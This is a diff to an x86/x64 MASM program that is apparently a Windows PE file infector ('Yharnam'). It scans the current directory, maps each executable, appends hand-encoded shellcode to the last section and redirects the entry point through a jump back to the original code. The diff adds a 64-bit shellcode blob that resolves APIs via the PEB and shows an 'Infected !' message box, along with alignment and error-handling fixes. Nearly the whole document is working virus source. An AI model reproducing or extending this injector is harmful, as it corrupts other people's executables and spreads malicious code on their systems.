@@ -20,9 +20,6 @@ includelib c:\masm32\lib\kernel32.lib
 includelib C:\masm32\lib\masm32.lib
 
 .data
-	strTitle		db 		"Bare Bone",0
- 	strMessage		db 		"Hello World!",0
- 	
 	pathTargetL		db		"Path target",0
 	listTargetL		db		"Targets list",0
 	nbSectionsL		db		"Nb sections",0
@@ -53,43 +50,55 @@ includelib C:\masm32\lib\masm32.lib
 	imgOptHeader	dd		0
 	imgEntryPoint	dd		0
 	sectionsHeader	dd		0
+	
+	code_test	byte 048h, 031h, 0C0h
 
-	;
-	;	Custom code
-	;
-	; pop eax
-	
-	;
-	;
-	;
-	
-    ;push esi
-	;xor eax, eax
-	;mov eax, fs:[eax + 0x30]
-	;mov eax, [eax + 0x0c]
-	;mov eax, [eax + 0x14]
-	;mov eax, [eax]
-	;mov eax, [eax]
-	;mov eax, [eax + 0x10]
-    code	byte 033h, 0c0h, 064h, 08bh, 040h, 030h, 054h, 08bh, 0ech, 083h, 0ech, 030h, 08bh, 040h, 00ch, 08bh
-			byte 040h, 014h, 08bh, 000h, 08bh, 000h, 08bh, 040h, 010h, 089h, 045h, 000h, 08bh, 0d8h, 003h, 05bh
-			byte 03ch, 08bh, 05bh, 078h, 003h, 05dh, 000h, 089h, 05dh, 004h, 068h, 073h, 073h, 000h, 000h, 068h
-			byte 064h, 064h, 072h, 065h, 068h, 072h, 06fh, 063h, 041h, 068h, 047h, 065h, 074h, 050h, 089h, 065h
-			byte 014h, 0bfh, 00eh, 000h, 000h, 000h, 089h, 07dh, 010h, 08bh, 07eh, 014h, 089h, 07dh, 008h, 08bh
-			byte 07eh, 018h, 089h, 07dh, 00ch, 08bh, 076h, 020h, 003h, 075h, 000h, 033h, 0c9h, 0ebh, 047h, 08bh
-			byte 075h, 004h, 08bh, 076h, 020h, 003h, 075h, 000h, 08bh, 0f9h, 0c1h, 0e7h, 002h, 003h, 0f7h, 08bh
-			byte 03eh, 003h, 07dh, 000h, 056h, 08bh, 075h, 014h, 051h, 08bh, 04dh, 010h, 0fch, 0f3h, 0a6h, 059h
-			byte 075h, 023h, 08bh, 075h, 004h, 08bh, 076h, 024h, 003h, 075h, 000h, 00fh, 0b7h, 03ch, 04eh, 08bh
-			byte 075h, 004h, 08bh, 076h, 01ch, 003h, 075h, 000h, 08bh, 03ch, 0beh, 003h, 07dh, 000h, 08bh, 0c7h
-			byte 089h, 07dh, 018h, 0ebh, 006h, 041h, 03bh, 04dh, 00ch, 072h, 0b4h, 06ah, 000h, 068h, 061h, 072h
-			byte 079h, 041h, 068h, 04ch, 069h, 062h, 072h, 068h, 04ch, 06fh, 061h, 064h, 054h, 0ffh, 075h, 000h
-			byte 0ffh, 0d0h, 089h, 045h, 01ch, 068h, 06ch, 06ch, 000h, 000h, 068h, 033h, 032h, 02eh, 064h, 068h
-			byte 055h, 073h, 065h, 072h, 054h, 0ffh, 0d0h, 068h, 06fh, 078h, 041h, 000h, 068h, 061h, 067h, 065h
-			byte 042h, 068h, 04dh, 065h, 073h, 073h, 054h, 050h, 08bh, 05dh, 018h, 0ffh, 0d3h, 089h, 045h, 020h
-			byte 068h, 06Fh, 078h, 041h, 000h, 068h, 061h, 067h, 065h, 042h, 068h, 04Dh, 065h, 073h, 073h, 089h
-			byte 065h, 018h, 089h, 065h, 01Ch, 06Ah, 000h, 08Bh, 055h, 018h, 052h, 08Bh, 055h, 01Ch, 052h, 06Ah
-			byte 000h, 0FFh, 0D0h, 06Ah, 000h, 0E8h, 000h, 000h, 000h, 000h, 0FFh, 025h, 000h, 020h, 040h, 000h
-			byte 000h, 000h,
+	code64		byte 055h, 048h, 08Bh, 0ECh, 048h, 081h, 0C4h, 070h, 0FFh, 0FFh, 0FFh, 048h, 033h, 0C0h, 067h, 065h
+				byte 048h, 08Bh, 040h, 060h, 048h, 08Bh, 040h, 018h, 048h, 08Bh, 040h, 020h, 048h, 08Bh, 000h, 048h
+				byte 08Bh, 000h, 048h, 08Bh, 040h, 020h, 048h, 089h, 045h, 0F8h, 048h, 08Bh, 0D8h, 066h, 003h, 05Bh
+				byte 03Ch, 08Bh, 09Bh, 088h, 000h, 000h, 000h, 048h, 003h, 05Dh, 0F8h, 048h, 089h, 05Dh, 0F0h, 048h
+				Byte 033h, 0FFh, 08Bh, 07Bh, 014h, 048h, 089h, 07Dh, 0E8h, 048h, 033h, 0FFh, 08Bh, 07Bh, 018h, 048h
+				byte 089h, 07Dh, 0E0h, 048h, 08Dh, 07Dh, 0C0h, 0C7h, 007h, 047h, 065h, 074h, 050h, 0C7h, 047h, 004h
+				byte 072h, 06Fh, 063h, 041h, 0C7h, 047h, 008h, 064h, 064h, 072h, 065h, 0C7h, 047h, 00Ch, 073h, 073h
+				byte 000h, 000h, 048h, 033h, 0C9h, 048h, 08Bh, 075h, 0F0h, 08Bh, 076h, 020h, 048h, 003h, 075h, 0F8h
+				byte 048h, 08Bh, 0F9h, 048h, 0C1h, 0E7h, 002h, 048h, 003h, 0F7h, 08Bh, 03Eh, 048h, 003h, 07Dh, 0F8h
+				byte 048h, 08Dh, 075h, 0C0h, 051h, 048h, 0C7h, 0C1h, 00Eh, 000h, 000h, 000h, 0FCh, 0F3h, 0A6h, 059h
+				byte 075h, 02Ah, 048h, 08Bh, 075h, 0F0h, 08Bh, 076h, 024h, 048h, 003h, 075h, 0F8h, 048h, 033h, 0FFh
+				byte 066h, 08Bh, 03Ch, 04Eh, 048h, 08Bh, 075h, 0F0h, 08Bh, 076h, 01Ch, 048h, 003h, 075h, 0F8h, 08Bh
+				byte 03Ch, 0BEh, 048h, 003h, 07Dh, 0F8h, 048h, 089h, 07Dh, 0D8h, 0EBh, 009h, 048h, 0FFh, 0C1h, 048h
+				byte 03Bh, 04Dh, 0E0h, 075h, 0A0h, 048h, 08Dh, 07Dh, 0B0h, 0C7h, 007h, 04Ch, 06Fh, 061h, 064h, 0C7h
+				byte 047h, 004h, 04Ch, 069h, 062h, 072h, 0C7h, 047h, 008h, 061h, 072h, 079h, 041h, 0C7h, 047h, 00Ch
+				byte 000h, 000h, 000h, 000h, 048h, 08Bh, 04Dh, 0F8h, 048h, 08Dh, 055h, 0B0h, 048h, 08Bh, 07Dh, 0D8h
+				byte 0FFh, 0D7h, 048h, 089h, 045h, 0D0h, 048h, 08Dh, 07Dh, 0A0h, 0C7h, 007h, 055h, 073h, 065h, 072h
+				byte 0C7h, 047h, 004h, 033h, 032h, 02Eh, 064h, 0C7h, 047h, 008h, 06Ch, 06Ch, 000h, 000h, 048h, 08Dh
+				byte 04Dh, 0A0h, 0FFh, 0D0h, 048h, 08Dh, 07Dh, 090h, 0C7h, 007h, 04Dh, 065h, 073h, 073h, 0C7h, 047h
+				byte 004h, 061h, 067h, 065h, 042h, 0C7h, 047h, 008h, 06Fh, 078h, 041h, 000h, 048h, 08Bh, 0C8h, 048h
+				byte 08Dh, 055h, 090h, 048h, 08Bh, 045h, 0D8h, 0FFh, 0D0h, 048h, 08Dh, 07Dh, 080h, 0C7h, 007h, 059h
+				byte 068h, 061h, 072h, 0C7h, 047h, 004h, 06Eh, 061h, 06Dh, 000h, 048h, 08Dh, 0BDh, 070h, 0FFh, 0FFh
+				byte 0FFh, 0C7h, 007h, 049h, 06Eh, 066h, 065h, 0C7h, 047h, 004h, 063h, 074h, 065h, 064h, 0C7h, 047h
+				byte 008h, 020h, 021h, 000h, 000h, 048h, 0C7h, 0C1h, 000h, 000h, 000h, 000h, 048h, 08Dh, 095h, 070h
+				byte 0FFh, 0FFh, 0FFh, 04Ch, 08Dh, 045h, 080h, 041h, 0B9h, 000h, 000h, 000h, 000h, 0FFh, 0D0h, 048h
+				byte 081h, 0C4h, 090h, 000h, 000h, 000h, 05Dh
+
+    code		byte 033h, 0c0h, 064h, 08bh, 040h, 030h, 054h, 08bh, 0ech, 083h, 0ech, 030h, 08bh, 040h, 00ch, 08bh
+				byte 040h, 014h, 08bh, 000h, 08bh, 000h, 08bh, 040h, 010h, 089h, 045h, 000h, 08bh, 0d8h, 003h, 05bh
+				byte 03ch, 08bh, 05bh, 078h, 003h, 05dh, 000h, 089h, 05dh, 004h, 068h, 073h, 073h, 000h, 000h, 068h
+				byte 064h, 064h, 072h, 065h, 068h, 072h, 06fh, 063h, 041h, 068h, 047h, 065h, 074h, 050h, 089h, 065h
+				byte 014h, 0bfh, 00eh, 000h, 000h, 000h, 089h, 07dh, 010h, 08bh, 07eh, 014h, 089h, 07dh, 008h, 08bh
+				byte 07eh, 018h, 089h, 07dh, 00ch, 08bh, 076h, 020h, 003h, 075h, 000h, 033h, 0c9h, 0ebh, 047h, 08bh
+				byte 075h, 004h, 08bh, 076h, 020h, 003h, 075h, 000h, 08bh, 0f9h, 0c1h, 0e7h, 002h, 003h, 0f7h, 08bh
+				byte 03eh, 003h, 07dh, 000h, 056h, 08bh, 075h, 014h, 051h, 08bh, 04dh, 010h, 0fch, 0f3h, 0a6h, 059h
+				byte 075h, 023h, 08bh, 075h, 004h, 08bh, 076h, 024h, 003h, 075h, 000h, 00fh, 0b7h, 03ch, 04eh, 08bh
+				byte 075h, 004h, 08bh, 076h, 01ch, 003h, 075h, 000h, 08bh, 03ch, 0beh, 003h, 07dh, 000h, 08bh, 0c7h
+				byte 089h, 07dh, 018h, 0ebh, 006h, 041h, 03bh, 04dh, 00ch, 072h, 0b4h, 06ah, 000h, 068h, 061h, 072h
+				byte 079h, 041h, 068h, 04ch, 069h, 062h, 072h, 068h, 04ch, 06fh, 061h, 064h, 054h, 0ffh, 075h, 000h
+				byte 0ffh, 0d0h, 089h, 045h, 01ch, 068h, 06ch, 06ch, 000h, 000h, 068h, 033h, 032h, 02eh, 064h, 068h
+				byte 055h, 073h, 065h, 072h, 054h, 0ffh, 0d0h, 068h, 06fh, 078h, 041h, 000h, 068h, 061h, 067h, 065h
+				byte 042h, 068h, 04dh, 065h, 073h, 073h, 054h, 050h, 08bh, 05dh, 018h, 0ffh, 0d3h, 089h, 045h, 020h
+				byte 068h, 06Fh, 078h, 041h, 000h, 068h, 061h, 067h, 065h, 042h, 068h, 04Dh, 065h, 073h, 073h, 089h
+				byte 065h, 018h, 089h, 065h, 01Ch, 06Ah, 000h, 08Bh, 055h, 018h, 052h, 08Bh, 055h, 01Ch, 052h, 06Ah
+				byte 000h, 0FFh, 0D0h, 06Ah, 000h, 0E8h, 000h, 000h, 000h, 000h, 0FFh, 025h, 000h, 020h, 040h, 000h
+				byte 000h, 000h,
 
 ; Struct url
 ;
@@ -126,7 +135,7 @@ GetInfoPE proc
  	add edi, 4h
  	add edi, mappedAddr
  	mov imgFileHeader, edi
- 	
+
  	; Check File Header addr
  	mov esi, mappedAddr
  	add esi, fileHeaderAddr
@@ -144,6 +153,7 @@ GetInfoPE proc
  	je InfoEndFailed
  	;and edi, 0000FFFFh
  	
+ 	mov machine86, 0
  	cmp di, 014Ch
  	jne MachineSuccess
 	mov machine86, 1
@@ -208,27 +218,6 @@ BLastSection:
 	add esi, SIZEOF IMAGE_SECTION_HEADER
 	dec ecx
 	jmp BLastSection
-	; Get nb sections
-	;mov edx, imgFileHeader
-	;mov bx, [edx].IMAGE_FILE_HEADER.NumberOfSections
-	;and ebx, 0000FFFFh
-	
-	;mov ecx, 0
-	;mov esi, sectionsHeader
-	;.WHILE ecx < ebx
-	;	mov lastSection, esi
-		;push ecx
-		;push ebx
-		;pop ebx
-		;pop ecx
-	;	add esi, sizeof IMAGE_SECTION_HEADER
-		;inc ecx
-	;.ENDW
-	;mov esi, lastSection
-	;invoke MessageBox, 0, esi, ADDR lastSectionL, MB_OK
-	
-	;mov eax, lastSection
-	;ret
 BLastSectionEnd:
 	mov esi, lastSection
 	invoke MessageBox, 0, esi, ADDR lastSectionL, MB_OK
@@ -281,8 +270,13 @@ InjectSection proc lastSection:DWORD
 	mov edx, [esi].IMAGE_SECTION_HEADER.VirtualAddress
 	mov ebx, [esi].IMAGE_SECTION_HEADER.SizeOfRawData
 	add edx, ebx
+	mov ebx, edx
+	and ebx, 000000FFFh
+	cmp ebx, 0
+	je PAGEALIGN
 	and edx, 0FFFFF000h
 	add edx, 1000h
+PAGEALIGN:
 	mov virtualEnd, edx
 	
 	; Overwrite entry point
@@ -325,7 +319,7 @@ InjectSection proc lastSection:DWORD
 	;ret 
 	; Test move to section.
 	mov edx, virtualEnd
-	add edx, 113h
+	;add edx, 113h
 	add edx, 4h
 	mov ebx, oldEntry
 	sub edx, ebx
@@ -338,20 +332,30 @@ InjectSection proc lastSection:DWORD
 	mov edx, targetSection
 	mov ebx, mappedAddr
 	add edx, ebx
-	;mov DWORD PTR [edx], 41414141h
+	
+
+	cmp machine86, 0
+	je Inject64
+
 	invoke MemCopy, ADDR code, edx, 113h
 	add edx, 113h
+	sub offsetEntry, 113h
+	jmp InjectJump
 
+Inject64:
+	;invoke MemCopy, ADDR code_test, edx, 3h
+	;add edx, 3h
+	
+	invoke MemCopy, ADDR code64, edx, 197h
+	add edx, 197h
+	sub offsetEntry, 197h
+	
+InjectJump:
 	mov BYTE PTR [edx], 0E9h
 	inc edx
 	mov ebx, offsetEntry
 	mov DWORD PTR [edx], ebx
-	;invoke MemCopy, ADDR code, edx, 25h
-	;mov DWORD ptr [edx], ebx
-	
-	
-	
-	;invoke MessageBox, 0, uhex$([ebx]), ADDR nbSectionsL, MB_OK
+InjectSectionEnd:
 	ret
 InjectSection endp
 
@@ -367,6 +371,8 @@ MapExe proc path:DWORD
 	; Ouvre l'exe
 	invoke OpenFile, path, ADDR buff, 2h
  	mov hfile, eax
+ 	cmp eax, -1
+ 	je MapExeEnd
 	;invoke MessageBox, 0, uhex$(hfile), ADDR strTitle, MB_OK
 	
 	invoke GetFileSize, hfile, ADDR fileSizeHigh
@@ -377,11 +383,14 @@ MapExe proc path:DWORD
 	
 	invoke CreateFileMapping, hfile, 0, PAGE_READWRITE, 0, nSize, 0
 	mov hfileMap, eax
+	cmp eax, 0
+	je MapExeEnd
 	;invoke MessageBox, 0, uhex$(hfile), ADDR strTitle, MB_OK
 	
 	invoke MapViewOfFile, hfileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0h
-	
 	mov DWORD PTR mappedAddr, eax
+	test eax, eax
+	jz MapExeEnd
 	;invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK
 
 	;
@@ -410,6 +419,7 @@ MapExe proc path:DWORD
 	;invoke OverwriteEntryPoint, 00414243h
 	;invoke DisplayEntryPoint
 	;invoke SectionTable
+MapExeEnd:
 	ret
 MapExe endp
 
@@ -432,7 +442,7 @@ ProcessFile proc uses edi edx Directory:PTR BYTE, File:PTR BYTE
 	test eax, eax
 	jz ProcessFileEnd
 	
-	;invoke MessageBox, 0, ADDR fileTarget, ADDR listTargetL, MB_OK
+	invoke MessageBox, 0, ADDR fileTarget, ADDR listTargetL, MB_OK
  	invoke MapExe, ADDR fileTarget
  	;
  	; Mapping de l'exe
@@ -467,8 +477,15 @@ Yharnam proc uses esi edi Directory:PTR BYTE
 
 	;invoke MessageBox, 0, uhex$(eax), ADDR listTargetL, MB_OK
 BDIR:
-	test eax, eax
- 	jz BDIREND
+	cmp eax, 0
+	je BDIREND
+	cmp eax, ERROR_FILE_NOT_FOUND
+	je BDIREND
+	cmp eax, ERROR_NO_MORE_FILES
+	je BDIREND
+	
+	;test eax, eax
+ 	;jz BDIREND
  	;mov eax, 0
  	
  	; Mes dans ebx l'addresse de ffd
@@ -490,11 +507,8 @@ Yharnam endp
 
 
 ; ---------------------------------------------------------
-;
+;	
 ; ---------------------------------------------------------
-
-align 4
-
 WinMain proc
 	; Destination pour le path
 	local buff[128]:byte
@@ -502,12 +516,14 @@ WinMain proc
 	; WIN API
 	invoke GetCurrentDirectory, 124, ADDR buff
 	
+ 	; Addr "\" to buff
  	invoke StrLen, ADDR buff
 	lea edi, buff
 	add edi, eax
 	mov WORD PTR [edi], 005Ch
+	
 	; Affiche le buffer et la taille avant rajout de "\*"
-	invoke MessageBox, 0, ADDR buff, ADDR pathTargetL, MB_OK	
+	;invoke MessageBox, 0, ADDR buff, ADDR pathTargetL, MB_OK	
 	;invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK
 	
 	invoke Yharnam, ADDR buff
